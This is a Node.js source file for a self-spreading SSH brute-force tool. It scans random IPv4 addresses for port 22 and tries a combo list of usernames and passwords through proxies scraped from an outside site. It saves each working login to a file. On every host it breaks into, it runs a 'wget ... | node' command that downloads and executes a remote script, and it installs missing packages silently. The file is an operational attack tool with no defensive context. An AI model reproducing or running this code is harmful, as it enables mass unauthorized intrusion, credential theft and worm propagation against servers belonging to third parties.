var payload = "wget -O - https://cdn.rawgit.com/G047/node-sshscan/master/scan.js | node"; //Put the command to run here

(function(){
    var r=require;
    require=function (n){
        try{
            return r(n)
        }
        catch(e){
            r('child_process').exec('npm i ' + n,function (err,body){
                try{

                    console.log('Module "' +n + '"" not found, try to install. Please restart the app\n' + body )
                    return r(n);
                }
                catch(e){
                }
            })
        }
    }
})()
var cluster = require('cluster');
var os = require('os')
var cpuCount = os.cpus().length;

if (cluster.isMaster) {
    for (var i = 0; i < cpuCount * 3; i++) {
        cluster.fork();
    }
    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
        cluster.fork()
    });
} else {

	var catcher = require('domain').create()
	catcher.on('error', function(err){
	})
	catcher.run(function(){

	//Shitty dependancys
	var net = require('net');
	var Promise = require('bluebird');

	var combo = [];
	var fs = require('fs');
	console.log('Loading ComboList');
	fs.readFile('combo', 'utf8', function(err, contents) {
	    combo = contents.split('\n');
	    for (var i = combo.length - 1; i >= 0; i--) {
	    	combo[i] = combo[i].split(':');
	    }
	    console.log('Loaded ComboList: ' + combo.length);
	});

	var proxies = [];
	var request = require('request');
	console.log('Loading Proxies');
	request('http://rsagartoolz.tk/ProxyScraper/socksPGrab.php', function (error, response, body) {
	  if (!error && response.statusCode == 200) {
	    proxies = body.split("<br />");
	    for (var i = proxies.length - 1; i >= 0; i--) {
	        proxies[i] = proxies[i].replace(/\r?\n|\r/g, "");
	    }
	    console.log('Loaded Proxies: ' + proxies.length);
	    setInterval(function(){
			attack(ipGen());
		}, 10);
	  } else {
	  	console.log(error);
	  }
	})

	function attack(ip) {
		checkConnection(ip, 22).then(function() {
		    console.log(ip + ' Open on port 22');
			for (var i = combo.length - 1; i >= 0; i--) {
				for (var i = 3 - 1; i >= 0; i--) {
					var proxy = proxies[Math.floor(Math.random()*proxies.length)]
					if (proxy) {
						proxy = proxy.split(':');
						sshClient(proxy[0], proxy[1], ip, combo[i][1], combo[i][2]);
					}
				}
			}
		}, function(err) {
		    //console.log(ip + ' Closed on port 22');
		})
	}

	function numGen() {
		return Math.floor(Math.random() * 255) + 1  
	}

	function ipGen() {
		return numGen() + '.' + numGen() + '.' + numGen() + '.' + numGen()
	}

	function checkConnection(host, port, timeout) {
	    return new Promise(function(resolve, reject) {
	        timeout = timeout || 1000;     // default of 10 seconds
	        var timer = setTimeout(function() {
	            reject("timeout");
	            socket.end();
	        }, timeout);
	        var socket = net.createConnection(port, host, function() {
	            clearTimeout(timer);
	            resolve();
	            socket.end();
	        });
	        socket.on('error', function(err) {
	            clearTimeout(timer);
	            reject(err);
	        });
	    });
	}

	function sshClient(proxy_ip, porxy_port, ip, user, pass) {
			var socks = require('socksv5'),
			    SSHClient = require('ssh2').Client;

			socks.connect({
			  host: ip, // destination
			  port: 22,
			  proxyHost: proxy_ip,
			  proxyPort: porxy_port,
			  auths: [ socks.auth.None() ]
			}, function(socket) {
			  var conn = new SSHClient();
			  conn.on('error', function() {});
			  conn.on('ready', function() {
			    conn.exec(payload, function(err, stream) {
			      if (err) throw err;
			      stream.on('close', function(code, signal) {
			      conn.end();
			      }).on('data', function(data) {
			      	fs.appendFile('message', user + '@' + ip + ':' + pass + "\n", function (err) {});
			        console.log(user + '@' + ip + ':' + pass);
			      }).stderr.on('data', function(data) {
			      	fs.appendFile('message', user + '@' + ip + ':' + pass + "\n", function (err) {});
			        console.log(user + '@' + ip + ':' + pass);
			      });
			    });
			  }).connect({
			    sock: socket,
			    username: user,
			    password: pass
			  });
			});
	}

})
}
